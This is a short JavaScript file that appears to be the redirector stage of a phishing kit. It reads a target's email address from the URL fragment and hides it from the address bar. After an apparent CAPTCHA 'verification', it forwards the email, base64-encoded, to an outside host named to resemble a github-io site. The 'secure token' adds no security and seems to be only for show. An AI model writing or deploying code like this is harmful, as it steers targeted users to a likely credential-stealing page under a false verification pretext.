function generateSecureToken(length = 64) {
  const array = new Uint8Array(length / 2);
  window.crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

// Base64 encode helper (URL-safe)
function encodeData(data) {
  return btoa(encodeURIComponent(data)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

window.onload = function() {
  const hash = window.location.hash.substring(1);
  if (hash && hash.includes("@")) {
    sessionStorage.setItem("redirect_email", hash);
    sessionStorage.setItem("redirect_token", generateSecureToken());
    history.replaceState(null, "", window.location.pathname);
  }
};

function onVerify(token) {
  const email = sessionStorage.getItem("redirect_email");
  const secureToken = sessionStorage.getItem("redirect_token");

  if (email && secureToken) {
    // Encode email with base64 before adding to URL
    const encodedEmail = encodeData(email);
    window.location.href = `https://ronnicf-github-io.onrender.com/adb.html#${encodedEmail}&token=${secureToken}`;
  } else {
    alert("Verification error. Please refresh and try again.");
  }
}
